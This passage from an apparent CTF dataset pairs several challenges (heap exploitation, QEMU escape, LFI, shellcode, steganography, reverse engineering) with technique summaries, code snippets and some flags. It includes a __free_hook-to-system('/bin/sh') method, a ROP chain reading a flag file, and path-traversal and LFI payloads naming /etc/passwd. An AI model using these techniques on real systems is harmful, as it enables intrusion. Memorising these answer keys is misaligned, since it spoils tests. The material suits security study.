            "In challenges involving SystemVerilog files representing Finite State Machines (FSMs) that advance states based on input, systematically analyzing the conditions for state transitions can reveal the sequence of inputs (`di` values) that transition the FSM from an initial state to a target solved state. This can be achieved by parsing the SystemVerilog file to create a map of state transitions and input values, then traversing this map either in a direct or reverse order depending on the problem specifics, to reconstruct the sequence of inputs representing the flag.\n\n   **Reconstructing Flag from FSM in SystemVerilog:**\n   ```python\n   # Assuming entries is a dict mapping current states to tuples of (next state, input_value) for direct mapping\n   # or mapping new states to previous states and input_values for reverse mapping.\n\n   state = initial_state  # Start state for direct traversal or end state for reverse traversal\n   flag = []\n   while some_condition:  # Condition to stop the traversal, usually reaching an end or start state\n       if direct_traversal:\n           state, input_value = entries[state]\n       elif reverse_traversal:\n           state, input_value = find_previous_state_and_input(entries, state)\n       flag.append(input_value)\n   if reverse_traversal:\n       flag.reverse()\n   print(''.join(flag))  # Convert the list of inputs to a string representing the flag\n   ```\n   \n   For reverse traversal, `find_previous_state_and_input` would be a function to select the correct tuple (previous_state, input_value) from entries, based on the current state."
        ],
        "key": "```systemverilog\nmodule fsmir(\n    input logic clk,\n    input logic reset,\n    input logic [7:0] di,\n    output logic solved\n);\n    logic [7:0] c;\n\n    always_ff @(posedge clk or posedge reset) begin\n        if (reset) begin\n            c <= 8'b0;\n        end else begin\n            case (c)\n                8'b00000000: if ((di ^ 8'b00000000) == 8'b00000001) c <= 8'b00000001;\n                8'b00000001: if ((di ^ 8'b00000001) == 8'b00000010) c <= 8'b00000010;\n                8'b00000010: if ((di ^ 8'b00000010) == 8'b00000011) c <= 8'b00000011;\n                // ... more state transitions ...\n                8'b00111010: if ((di ^ 8'b00111010) == 8'b00111011) c <= 8'b00111011;\n                default: c <= 8'b0;\n            endcase\n        end\n    end\n\n    assign solved = (c == 8'b00111011);\nendmodule\n```"
    },
    {
        "name": "FSMir",
        "write_up": "dataset/raw/FSMir.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 154,
        "max_score": 500,
        "difficulty": 0.308,
        "knowledge": [
            "In a challenge that requires analyzing binary behavior, using symbolic execution tools like angr can identify paths that lead to successful outcomes without manually tracing complex logic. When the binary expects a specific input of a fixed length to display a success message or a flag, a symbolic variable for the input length can be defined to let the tool automatically find the input string that satisfies all conditions leading to the success message.\n   - Example usage with angr:\n     ```python\n     import angr\n     import claripy\n\n     p = angr.Project(\"binary_name\")\n     symsize = claripy.BVS('inputLength', bit_length)  # Bit length to match expected input length\n     simfile = angr.SimFile('/tmp/stdin', size=symsize)\n     state = p.factory.entry_state(stdin=simfile)\n     simgr = p.factory.simulation_manager(state)\n     simgr.explore(find=lambda s: b\"Success Message\" in s.posix.dumps(1))\n     if simgr.found:\n         found_state = simgr.found[0]\n         print(found_state.posix.dumps(0))  # Output the flag or success input\n     ```",
            "In challenges involving reverse engineering of SystemVerilog code to find input sequences (flags), mapping the state transitions and the input (`di`) that cause these transitions can reconstruct the required input sequence. This process involves identifying the XOR relationship between the current state, the input, and the next state, and using this relationship to traverse from the initial state to the final (solution) state.\n   - Example approach to reconstruct input sequence:\n     ```python\n     # Initialize variables to represent states and the flag\n     state = initial_state\n     flag = []\n     # Transition map, where key is the current state, and value is a tuple of (next_state, input_character)\n     entries = {current_state: (next_state, 'input_character')}\n     \n     while state != final_state:\n         state, flag_part = entries[state]\n         flag.append(flag_part)\n     \n     # Combine flag parts to get the full flag\n     reconstructed_flag = ''.join(flag)\n     print(\"FLAG:\", reconstructed_flag)\n     ```"
        ],
        "key": "```systemverilog\nmodule fsmir (\n    input logic clk,\n    input logic reset,\n    input logic [7:0] di,\n    output logic solved\n);\n    logic [7:0] c;\n\n    always_ff @(posedge clk or posedge reset) begin\n        if (reset) begin\n            c <= 8'b0;\n        end else begin\n            case (c)\n                8'b00000000: if ((di ^ c) == 8'b00000001) c <= 8'b00000001;\n                8'b00000001: if ((di ^ c) == 8'b00000010) c <= 8'b00000010;\n                8'b00000010: if ((di ^ c) == 8'b00000011) c <= 8'b00000011;\n                // ... more state transitions ...\n                8'b00111010: if ((di ^ c) == 8'b00111011) c <= 8'b00111011;\n                default: c <= 8'b0;\n            endcase\n        end\n    end\n\n    assign solved = (c == 8'b00111011);\nendmodule\n```"
    },
    {
        "name": "fufu",
        "write_up": "dataset/raw/fufu.md",
        "type": "pwn",
        "competition": [
            "KillerQueen/2021",
            "https://ctftime.org/event/1482/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a heap exploitation challenge, if confronted with a scenario where only one chunk at a time can be interacted with, and there's a need to perform operations such as freeing two different chunks of the same size without mallocing any in between (to avoid triggering security checks such as tcache count or double free detection in libc 2.31), one can employ a strategy that involves alternating malloc and free operations across different sizes. This can be orchestrated by reallocating freed chunks with a different size (using underflows or overflows if necessary) to manipulate the chunk's metadata and achieve the desired state in the heap for further exploitation.",
            "When the challenge allows manipulating the pointer to a function (like __free_hook) in libc, and the binary provides the ability to control content on the heap (via an overflow, underflow, or a similar vulnerability), it is possible to redirect execution flow to arbitrary functions within libc (e.g., system()). This can be achieved by first leaking libc addresses to bypass ASLR, then crafting payloads that align with the target system's architecture and libc version to overwrite pointers such as __free_hook with the address of system(). Finally, ensuring that the input to the next free operation aligns with a command (e.g., \"/bin/sh\") to get executed by the system() call.\n   \n   - Example Payload Steps:\n     1. Leak libc addresses using heap operations and manipulation.\n     2. Use an underflow or overflow vulnerability to write the libc address of `system()` into `__free_hook`.\n     3. Ensure a chunk containing \"/bin/sh\" string is allocated on the heap.\n     4. Trigger a scenario (e.g., another heap operation) that leads to the invocation of `free()` on the \"/bin/sh\" chunk, which now effectively calls `system(\"/bin/sh\")` due to the manipulation of `__free_hook`."
        ],
        "key": "```c\nvoid inbuf(char *buf, int size) {\n    char c;\n    char local_9 = 0;\n    while (local_9 < size) {\n        c = getchar();\n        if (c == '\\n') break;\n        buf[local_9] = c;\n        local_9++;\n    }\n    buf[local_9] = '\\0';\n}\n```"
    },
    {
        "name": "Full Chain - Wall Maria",
        "write_up": "dataset/raw/Full Chain - Wall Maria.md",
        "type": "reverse",
        "competition": [
            "HITCON/2023/Quals",
            "https://ctftime.org/event/2019/tasks/"
        ],
        "score": -1,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In QEMU escape challenges where a custom QEMU PCI driver vulnerability is found, the exploit often hinges on out-of-bounds (OOB) read or write vulnerabilities in memory-mapped IO (MMIO) handlers. Specifically, if the read or write size is incorrectly handled, it permits manipulating memory outside of intended buffers, enabling attackers to read or alter adjacent memory structures. This can lead to information leakage or arbitrary code execution by modifying function pointers or setting up ROP chains in the adjacent structures.",
            "In scenarios where the target environment employs sandboxing that restricts direct execution of arbitrary commands, alternative syscall-based strategies like using `open`, `read`, and `write` syscalls can be employed to interact with files or execute indirect actions. Leveraging gadgets found within the binary to manipulate the stack and registers allows for crafting a ROP chain to execute these syscalls sequentially. This tactic enables attackers to bypass the sandbox restrictions and achieve their objectives, e.g., reading a flag file.\n\n   Example payload segment for the ROP chain to read and write a file:\n   ```c\n   /* open(\"/home/user/flag\", O_RDONLY) */\n   *rop++ = pop_rdi;\n   *rop++ = flag_file_str_addr; // Address of \"/home/user/flag\" string\n   *rop++ = pop_rsi;\n   *rop++ = 0; // O_RDONLY\n   *rop++ = pop_rax;\n   *rop++ = 2; // syscall number for open\n   *rop++ = syscall;\n   /* read file */\n   *rop++ = xchg_edi_eax;\n   *rop++ = pop_rsi;\n   *rop++ = buffer_addr; // Buffer to store the read content\n   *rop++ = pop_rdx;\n   *rop++ = 0x100; // Number of bytes to read\n   *rop++ = pop_rax;\n   *rop++ = 0; // syscall number for read\n   *rop++ = syscall;\n   /* write content to stdout */\n   *rop++ = xchg_edx_eax;\n   *rop++ = pop_rdi;\n   *rop++ = 1; // STDOUT\n   *rop++ = pop_rax;\n   *rop++ = 1; // syscall number for write\n   *rop++ = syscall;\n   ```"
        ],
        "key": "```c\n#define BUFF_SIZE 0x2000\n\ntypedef struct {  \n   PCIDevice pdev;  \n   struct {  \n               uint64_t src;  \n       uint8_t off;  \n       } state;  \n   char buff[BUFF_SIZE];  \n   MemoryRegion mmio;  \n} MariaState;  \n\nstatic uint64_t maria_mmio_read(void *opaque, hwaddr addr, unsigned size) {  \n   MariaState *maria = (MariaState *)opaque;  \n   uint64_t val = 0;  \n   switch (addr) {  \n       case 0x00:  \n           cpu_physical_memory_rw(maria->state.src, &maria->buff[maria->state.off], BUFF_SIZE, 1);  \n           val = 0x600DC0DE;  \n           break;  \n       case 0x04:  \n           val = maria->state.src;  \n           break;  \n       case 0x08:  \n           val = maria->state.off;  \n           break;  \n       default:  \n           val = 0xDEADC0DE;  \n           break;  \n   }  \n   return val;  \n}\n```"
    },
    {
        "name": "FusEd",
        "write_up": "dataset/raw/FusEd.md",
        "type": "crypto",
        "competition": [
            "CCCamp/2023",
            "https://ctftime.org/event/2048/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In contexts involving manipulation of embedded system firmware or cryptographic keys where direct modification is prevented, exploit the logic of memory segment handling to alter readonly memory values indirectly. Utilize bitwise operations where direct writing might perform a binary OR with the existing value, allowing change from 0 to 1 but not vice versa. This technique is particularly useful in scenarios requiring modification of cryptographic keys stored in PROM(memory programmed at manufacture time and not expected to be modified) to bypass security mechanisms.",
            "When dealing with curve-based cryptography, specifically EdDSA (Edwards-curve Digital Signature Algorithm), constructing a public key with a high number of bits set to 1 increases the likelihood of successfully overriding a readonly key by binary OR-ing, under the scenario where a challenge involves circumventing public key verification mechanisms. This is due to the structure of curve equations and the fact that key validation processes often rely on certain mathematical properties of the keys. Constructing a payload or key with a specific property (like having a high number of bits set to 1) could leverage the curve's mathematical characteristics to meet the conditions required for a successful attack.\n\nSample Payload/Modification Approach:\n- To increase the chance of successfully writing a custom public key into a readonly segment (e.g., PROM), construct the key with minimal zeroes. For example, if aiming to set a custom public key in the EdDSA system, consider using the modulus value of the curve (`q`) incremented by 1 for its high one-bit count, which can increase the likelihood of satisfying the bitwise OR condition required for modification.\n  \n  ```\n  # Example Python snippet to set a high-bit public key:\n  my_pk = bytes([238, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n  255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n  255, 255, 255, 255, 127])\n  ```"
        ],
        "key": "```python\ndef flash_segment(segment, image, signature=None):  \n   if signature is None:  \n       signature = bytes(1)  \n   else:  \n       assert len(signature) == 64  \n   assert len(image) > 0  \n   assert len(signature) > 0\n\n   _choice('2')  \n   io.sendlineafter('Segment: ', str(segment))  \n   io.sendlineafter('Image: ', image.hex())  \n   io.sendlineafter('Signature: ', signature.hex())\n\ndef dump_segment(segment):  \n   import hexdump  \n   _choice('3')  \n   io.sendlineafter('Segment: ', str(segment))  \n   io.recvuntil('Content: \\n')  \n   return hexdump.restore(io.recvuntilS('\\n\\nMain menu:', drop=True))\n\ndef run_mcu():  \n   _choice('4')  \n```\n\n```c\n#include <stdlib.h>  \n#include <assert.h>  \n#include <stdio.h>  \n#include <string.h>  \n#include <unistd.h>  \n#include \"crypto_sign.h\"  \n#include \"sha512.h\"  \n#include \"ge25519.h\"\n\nstatic void get_hram(unsigned char *hram, const unsigned char *sm, const\nunsigned char *pk, unsigned char *playground, unsigned long long smlen)  \n{  \n\tunsigned long long i;\n\n\tfor (i =  0;i < 32;++i)    playground[i] = sm[i];  \n\tfor (i = 32;i < 64;++i)    playground[i] = pk[i-32];  \n\tfor (i = 64;i < smlen;++i) playground[i] = sm[i];\n\n\tcrypto_hash_sha512(hram,playground,smlen);  \n}\n\nvoid die(const char * msg) {  \n\tputs(msg);  \n\tfflush(stdout);  \n\texit(1);  \n}\n\nvoid dump_array_32(const crypto_uint32 *array, size_t size) {  \n\tif (size == 0)  \n\t\treturn;  \n\tfor (size_t i = 0; i < size-1; i++) {  \n\t\tprintf(\"%02X \", array[i]);  \n\t}  \n\tprintf(\"%02X\", array[size-1]);  \n}  \nvoid dump_array(const unsigned char *array, size_t size) {  \n\tif (size == 0)  \n\t\treturn;  \n\tfor (size_t i = 0; i < size-1; i++) {  \n\t\tprintf(\"%02X \", array[i]);  \n\t}  \n\tprintf(\"%02X\", array[size-1]);  \n}\n\n#define BYTES (64 + 4)\n\nconst unsigned char pk[32] = {237, 255, 255, 255, 255, 255, 255, 255, 255,\n255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n255, 255, 255, 255, 255, 255, 127};  \nunsigned char m[BYTES];  \nunsigned char sm[BYTES];  \nint main() {  \n\tunsigned long long mlen_ = BYTES;  \n\tunsigned long long *mlen = &mlen_;  \n\tunsigned long long smlen = BYTES;\n\n\tsm[64] = 'a';  \n\tsm[64+1] = 'b';  \n\tsm[64+2] = 'c';  \n\tsm[64+3] = 'd';\n\n\tint i, ret;  \n\tunsigned char t2[32];  \n\tge25519 get1, get2;  \n\tsc25519 schram, scs;  \n\tunsigned char hram[crypto_hash_sha512_BYTES];\n\n\tret = ge25519_unpackneg_vartime(&get1, pk);  \n\tif (ret != 0)  \n\t\tdie(\"ge25519_unpackneg_vartime failed\");\n\n\tget_hram(hram,sm,pk,m,smlen);\n\n\tsc25519_from64bytes(&schram, hram);\n\n\tsc25519_from32bytes(&scs, sm+32);\n\n\tge25519_double_scalarmult_vartime(&get2, &get1, &schram, &ge25519_base, &scs);  \n\tge25519_pack(t2, &get2);\n\n\tprintf(\"t2 = \");  \n\tdump_array(t2, 32);  \n\tprintf(\"\\n\");\n\n\tret = crypto_verify_32(sm, t2);  \n\tif (ret != 0)  \n\t\tdie(\"crypto_verify_32 failed\");\n\n\tputs(\"OK\");  \n\treturn 0;  \n}  \n```"
    },
    {
        "name": "fvm",
        "write_up": "dataset/raw/fvm.md",
        "type": "The type of this CTF challenge is **reverse**.",
        "competition": [
            "zer0pts/2023",
            "https://ctftime.org/event/1972/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges involving virtual machines (VMs) that use x87 floating-point operations, understanding the behavioral semantics of x87 instructions is crucial. Key operations such as conditional jumps, stack manipulations (push, pop, exchange), and arithmetic (add, sub, mul, div) are often represented differently in disassembled code. Tools like Ghidra might not accurately replicate the stack behavior or instruction effects in their decompiled view. Thus, referring to an authoritative source like the list of x86 and x87 instructions at https://www.felixcloutier.com/x86/ can aid in accurately interpreting what each VM instruction does, especially when the VM implements its own instruction set on top of x87 operations.",
            "For challenges that involve analyzing or cracking custom bytecode or VM instructions, writing a custom disassembler can greatly enhance understanding and facilitate automated analysis. This approach involves mapping each custom opcode to its functionality, which might include arithmetic operations, stack manipulations, conditional jumps, or special operations like reading from or jumping to positions based on stack values. A custom disassembler allows for a structured representation of the bytecode, making patterns more noticeable and debugging with tools like GDB more efficient. One can use Python for this task, utilizing its string manipulation and numerical capabilities to interpret byte sequences as opcodes and operands, converting them into a human-readable format or into comments that can be further analyzed either statically or dynamically with debuggers.\n   \n   Example of a disassembler output line transformation:\n   - Before: `0x01 0x56 0x89`\n   - After: `ADD R1, R2 // Adds contents of R2 to R1`"
        ],
        "key": "```cpp\nstd::basic_istream<>::read((char *)this,(long)&local_5c);  \nif (((byte)this[0xa0] & 2) != 0) {  \n  pcVar1 = (code *)swi(3);  \n  (*pcVar1)();  \n  return;  \n}\n```\n\n```cpp\nstd::basic_istream<>::seekg((long)this,(_Ios_Seekdir)local_58);\n```\n\n```cpp\nlocal_58 = std::basic_istream<>::tellg();  \nin_ST0 = (longdouble)local_58;\n```\n\n```cpp\nstd::basic_istream<>::seekg((long)this,(int)local_5a);\n```\n\n```cpp\nstd::basic_istream<>::read((char *)this,(long)&local_4a);  \nin_ST0 = local_4a;\n```"
    },
    {
        "name": "Galleria 1",
        "write_up": "dataset/raw/Galleria 1.md",
        "type": "web",
        "competition": [
            "CSCML/2020",
            "https://ctftime.org/event/1071/tasks/"
        ],
        "score": 310,
        "max_score": 500,
        "difficulty": 0.62,
        "knowledge": [
            "When dealing with web applications that include file or directory fetching features, inspecting the AJAX requests can reveal potential vulnerabilities. Specifically, look for parameters that influence file paths, such as \"folder\" or \"file\" parameters. This can be exploited using path traversal techniques to access files outside the intended directory. For path traversal, use relative paths (e.g., \"../\" to move up a directory) in the parameter to navigate the server's file system. Example payload: `../` or `../../` to navigate up directories.",
            "If encountering PHP scripts that allow file content viewing through parameters, this can be exploited to read arbitrary files on the system assuming the web server has the necessary permissions. This is particularly dangerous if the script does not properly sanitize user input, allowing for Local File Inclusion (LFI) vulnerabilities. To exploit such vulnerabilities, craft the input to the vulnerable parameter to include the path to sensitive files (e.g., `/etc/passwd`, or in this case, the path to a flag file). Example payload: `?debug=TRUE&file=/path/to/sensitivefile.txt`"
        ],
        "key": "```php\n$folder = $_REQUEST[\"folder\"];\n$pictues = glob($folder . \"/*\");\n```\n\n```php\n$file = $_REQUEST[\"file\"];\nprint file_get_contents($file);\n```"
    },
    {
        "name": "gallery",
        "write_up": "dataset/raw/gallery.md",
        "type": "This write-up describes a forensics challenge where the participant had to recover a hidden flag from an EWF (Expert Witness) image file using steganography techniques and brute-forcing a password. The challenge involved examining the contents of the damaged disk to extract hidden information. Therefore, the type of this challenge is **forensics**.",
        "competition": [
            "CrewCTF/2023",
            "https://ctftime.org/event/2032/tasks/"
        ],
        "score": -1.0,
        "max_score": 957,
        "difficulty": -1,
        "knowledge": [
            "When dealing with EWF (Expert Witness Format) files in digital forensics CTF challenges, using ewf-tools can effectively mount the EWF file to a mount point for further analysis. This tool simplifies the process of accessing the contents of EWF files on systems like Kali Linux.",
            "In challenges involving steganography, particularly when suspecting hidden data within JPEG files and a password is required for extraction, leveraging tools like stegcracker in conjunction with a potential wordlist extracted from the challenge can be an effective method to brute-force the password and retrieve hidden data. Successful brute-forcing results in the extraction of the hidden file, revealing the flag or additional clues.\n\n   Example payload: `stegcracker Wallpaper_HD_19756487Ef4.jpg wordlist.txt`"
        ],
        "key": "```python\ndef extract_data_from_image(image_path, wordlist_path):\n    import subprocess\n\n    # Use steghide to extract data from the image\n    command = f\"steghide extract -sf {image_path} -p ''\"\n    result = subprocess.run(command, shell=True, capture_output=True, text=True)\n\n    if \"could not extract any data\" in result.stderr:\n        # If no data is extracted, try using a wordlist to brute force the password\n        with open(wordlist_path, 'r') as wordlist:\n            for password in wordlist:\n                password = password.strip()\n                command = f\"steghide extract -sf {image_path} -p {password}\"\n                result = subprocess.run(command, shell=True, capture_output=True, text=True)\n                if \"wrote extracted data\" in result.stdout:\n                    print(f\"Successfully extracted data with password: {password}\")\n                    break\n    else:\n        print(\"Data extracted without a password.\")\n\n# Example usage\nextract_data_from_image(\"Wallpaper_HD_19756487Ef4.jpg\", \"wordlist.txt\")\n```"
    },
    {
        "name": "Game Graphics Debugging",
        "write_up": "dataset/raw/Game Graphics Debugging.md",
        "type": "This write-up describes a reverse engineering challenge where the author had to debug the graphics of a game to find the hidden flag. Based on the details provided, the type of challenge is **reverse**.",
        "competition": [
            "WolvCTF/2024",
            "https://ctftime.org/event/2240/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When a binary crashes due to a missing or incorrect version of a dynamic link library (DLL), especially in the context of graphics applications, attempt to diagnose and solve the issue by identifying the expected version of the DLL through debugging tools or log messages. Subsequently, download or acquire the correct version and place it in the application's directory to override the system's default DLL. This is based on the application's behavior of first checking its own directory for the required DLLs before consulting system-wide directories.",
            "In situations where obfuscation or unusual encoding prevents direct analysis through standard means, such as inspecting strings or dissecting entry points, investigate the binary's interaction with the operating system's and graphics API's threading and memory management mechanisms. Specifically, look for operations involving Thread Local Storage (TLS) as a tactic for hiding or manipulating data, such as flags, within secure or isolated memory spaces. This approach is particularly beneficial in reversing challenges involving graphical applications or games, where data might be obfuscated or stored in unconventional ways.\n\nExample of suspicious code hinting at flag manipulation using TLS and XOR operations:\n```cpp\nif (flag_arr[39])\n{\n  *flag_arr ^= 0x8Fu;\n  flag_arr[1] ^= 0xC7u;\n  // further XOR operations\n  flag_arr[39] = 0;\n}\n```"
        ],
        "key": "```cpp  \nv21 = (__m128i *)*((_QWORD *)NtCurrentTeb()->ThreadLocalStoragePointer +\n(unsigned int)TlsIndex);  \nv22 = v21[6].m128i_i32[2];  \nflag_arr = v21[4].m128i_i8;  \nif ( (v22 & 1) == 0 )  \n{  \n  v21[6].m128i_i32[2] = v22 | 1;  \n  v21[6].m128i_i8[7] = 1;  \n  if ( flag_arr > &v161 || &v21[6].m128i_u16[3] < (unsigned __int16 *)v158 )  \n  {  \n    *(__m128i *)flag_arr = si128;  \n    v21[5] = v20;  \n    v21[6].m128i_i32[0] = v159;  \n    v21[6].m128i_i16[2] = v160;  \n    v21[6].m128i_i8[6] = -45;  \n  }  \n  else  \n  {  \n    *(__m128i *)flag_arr = si128;  \n    v21[5] = v20;  \n    v21[6].m128i_i32[0] = v159;  \n    v21[6].m128i_i16[2] = v160;  \n    v21[6].m128i_i8[6] = -45;  \n  }  \n  _tlregdtor(&unk_7FF79A524270);  \n}  \nif ( flag_arr[39] )  \n{  \n  *flag_arr ^= 0x8Fu;  \n  flag_arr[1] ^= 0xC7u;  \n  flag_arr[2] ^= 0xFu;  \n  flag_arr[3] ^= 0x57u;  \n  flag_arr[4] ^= 0xFDu;  \n  flag_arr[5] ^= 0xDBu;  \n  flag_arr[6] ^= 0xD3u;  \n  flag_arr[7] ^= 0xC7u;  \n  flag_arr[8] ^= 0x8Fu;  \n  flag_arr[9] ^= 0xC7u;  \n  flag_arr[10] ^= 0xFu;  \n  flag_arr[11] ^= 0x57u;  \n  flag_arr[12] ^= 0xFDu;  \n  flag_arr[13] ^= 0xDBu;  \n  flag_arr[14] ^= 0xD3u;  \n  flag_arr[15] ^= 0xC7u;  \n  flag_arr[16] ^= 0x8Fu;  \n  flag_arr[17] ^= 0xC7u;  \n  flag_arr[18] ^= 0xFu;  \n  flag_arr[19] ^= 0x57u;  \n  flag_arr[20] ^= 0xFDu;  \n  flag_arr[21] ^= 0xDBu;  \n  flag_arr[22] ^= 0xD3u;  \n  flag_arr[23] ^= 0xC7u;  \n  flag_arr[24] ^= 0x8Fu;  \n  flag_arr[25] ^= 0xC7u;  \n  flag_arr[26] ^= 0xFu;  \n  flag_arr[27] ^= 0x57u;  \n  flag_arr[28] ^= 0xFDu;  \n  flag_arr[29] ^= 0xDBu;  \n  flag_arr[30] ^= 0xD3u;  \n  flag_arr[31] ^= 0xC7u;  \n  flag_arr[32] ^= 0x8Fu;  \n  flag_arr[33] ^= 0xC7u;  \n  flag_arr[34] ^= 0xFu;  \n  flag_arr[35] ^= 0x57u;  \n  flag_arr[36] ^= 0xFDu;  \n  flag_arr[37] ^= 0xDBu;  \n  flag_arr[38] ^= 0xD3u;  \n  flag_arr[39] = 0;  \n}  \n```"
    },
    {
        "name": "gelcode",
        "write_up": "dataset/raw/gelcode.md",
        "type": "pwn",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": 490,
        "max_score": 493,
        "difficulty": 0.9939148073022313,
        "knowledge": [
            "When faced with a shellcode challenge that restricts code to a specific subset (e.g., byte values from `0x00` to `0x0f`), it is possible to construct arbitrary instruction codes using only the allowed instructions by carefully manipulating registers and memory. This is achieved by performing operations that alter register values and memory contents in ways that result in the desired code execution. For example, incrementing the `rax` register by `0x01` and then writing to a memory location pointed to by `rdx + rax` to insert byte values that form valid instructions not directly writable due to the restrictions.",
            "In scenarios where direct execution of certain instructions is not possible due to input restrictions, one can leverage the properties of allowed operations (such as `add` and `or`) and the programmable control over register values and memory locations to indirectly create and execute a more complex shellcode. This involves setting up initial register states, incrementing specific register values, and using those registers as pointers or offsets to modify memory contents in a way that sequentially constructs the final intended executable code in memory. Example approach: Starting by setting a register to zero using `xor` with itself if possible, then using `add` instructions to increment a register or memory content byte by byte to the desired value, and strategically placing bytes in memory to form a functional shellcode sequence.\n   \nExample payload snippet:\n```asm\n# Assuming rdx points to writable memory and we can manipulate rax and rcx registers\nadd al, 0x01  # Increase AL by 1\nadd BYTE PTR [rdx+rax*1], al  # Write incremented value to [rdx+rax]\nadd cl, byte PTR [rdx]  # Use contents at rdx to increment cl\n```"
        ],
        "key": "```c\nvoid main(void)  \n{  \n code *__ptr;  \n int local_14;  \n  \n setvbuf(stdin,(char *)0x0,2,0);  \n setvbuf(stdout,(char *)0x0,2,0);  \n setvbuf(stderr,(char *)0x0,2,0);  \n __ptr = (code *)malloc(1000);  \n mprotect((void *)((ulong)__ptr & 0xfffffffffffff000),0x1000,7);  \n puts(\"Input, please.\");  \n fread(__ptr,1,1000,stdin);  \n local_14 = 0;  \n while (local_14 < 1000) {  \n   if (0xf < (byte)__ptr[local_14]) {  \n     __ptr[local_14] = (code)0x0;  \n   }  \n   local_14 = local_14 + 1;  \n }  \n (*__ptr)();  \n free(__ptr);  \n                   /* WARNING: Subroutine does not return */  \n exit(0);  \n}  \n```"
    },
    {
        "name": "Generic Flag Checker 1",
        "write_up": "dataset/raw/Generic Flag Checker 1.md",
        "type": "reverse",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 75,
        "max_score": 800,
        "difficulty": 0.09375,
        "knowledge": [
            "When dealing with ELF (Executable and Linkable Format) files in reverse engineering challenges, static analysis is a foundational approach that involves examining the binary without executing it. Tools like `strings` can reveal embedded strings such as a flag or hints towards its location. This method is particularly effective for small to medium-sized binaries and can sometimes directly reveal the flag if not sufficiently obfuscated or hidden.\n   - Example command: `strings gfc1 | grep -i flag`",
            "For more complex ELF binaries where static analysis with basic tools does not yield results, using advanced software reverse engineering tools like Ghidra is recommended. Ghidra facilitates a deeper static analysis, providing a disassembled view of the executable, decompiler output, and various analyses that aid in understanding the binary's functionality. This is particularly useful for binaries that incorporate more complex logic for the flag-checking mechanism.\n   - Tip: No specific payload, but the approach would typically involve loading the ELF file into Ghidra, using the decompiler to understand the checking mechanism, and then crafting an input or exploiting a vulnerability accordingly."
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint check_flag(char *input) {\n    char flag[] = \"nactf{un10ck_th3_s3cr3t5_w1th1n_cJfnX3Ly4DxoWd5g}\";\n    return strcmp(input, flag) == 0;\n}\n\nint main() {\n    char input[64];\n    printf(\"Enter the flag: \");\n    scanf(\"%63s\", input);\n    if (check_flag(input)) {\n        printf(\"Correct!\\n\");\n    } else {\n        printf(\"Incorrect!\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Generic Flag Checker 2",
        "write_up": "dataset/raw/Generic Flag Checker 2.md",
        "type": "reverse",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 150,
        "max_score": 800,
        "difficulty": 0.1875,
        "knowledge": [
            "When static analysis of a binary or executable file does not reveal the flag or its mechanism, dynamic analysis is the next viable step. Tools such as \"strace\" for tracing system calls and \"ltrace\" for tracing library calls can be instrumental. The choice between \"strace\" and \"ltrace\" depends on whether the interest lies in the system calls made by the program or the library calls. In scenarios where the executable is interacting with library functions, \"ltrace\" should be considered for capturing the flag-checking logic or any other relevant interactions that could lead to the discovery of the flag.",
            "For capturing complete outputs or strings that exceed the default limit in tools like \"ltrace\", the \"-s\" parameter can be used. This parameter allows the user to specify the maximum string size to print, which is crucial for capturing entire flags or long strings that are part of the executable's output or debugging information. For example, running \"ltrace -s 123 ./executable\" would adjust the string limit to 123 characters, ensuring that longer outputs are not truncated, aiding in the complete capture of the flag or the debugging information needed for solving challenges.\n   - Example command to ensure full output: `ltrace -s 123 ./gfc2`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    char input[64];\n    printf(\"what's the flag?\\n\");\n    fgets(input, 64, stdin);\n\n    if (strncmp(input, \"nactf{s0m3t1m3s_dyn4m1c_4n4lys1s_w1n5_gKSz3g6RiFGkskXx}\", 56) == 0) {\n        printf(\"Correct!\\n\");\n    } else {\n        printf(\"nope, not this time!\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "geoguesser",
        "write_up": "dataset/raw/geoguesser.md",
        "type": "pwn",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When dealing with challenges that involve random number generation (RNG) where the RNG is seeded with a predictable value such as the current time, it is possible to replicate the RNG output by creating a custom script that uses the same seed. This can be particularly useful in scenarios where guessing the correct input depends on predicting the output of the RNG. For instance, in a geoguesser game where coordinates are randomly generated, synchronizing the RNG seed (e.g., current time) between the attacker's script and the challenge can predict the coordinates.\n   - Example script snippet: \n     ```janet\n     (let [t (math/rng (os/time))]  \n       (printf \"%.4f,%.4f\"  \n         (+ -90 (* 180 (math/rng-uniform t)))  \n         (+ -180 (* 360 (math/rng-uniform t)))))\n     ```",
            "When automating the interaction with a challenge that requires input based on the output of a custom script, it is advantageous to use a script automation tool or library like pwntools. This is particularly relevant when the script needs to interact with a remote service and where the timing of sending payloads can affect the outcome of the challenge. Adjusting the timing and the order of operations in your script can be crucial for success.\n   - Example pwntools script snippet:\n     ```python\n     #!/usr/bin/env python3\n     from pwn import *\n     target = remote(\"geoguesser.chal.uiuc.tf\", 1337)\n     val = subprocess.check_output(['janet', 'main.janet'])\n     print(target.recvline())\n     target.sendline(val)\n     print(target.recvline())\n     ```\n     Note: In this example, `subprocess.check_output(['janet', 'main.janet'])` is used to execute the janet script and generate the payload based on the current time-seeded random number generator. Then, `target.sendline(val)` is used to send this payload to the challenge server."
        ],
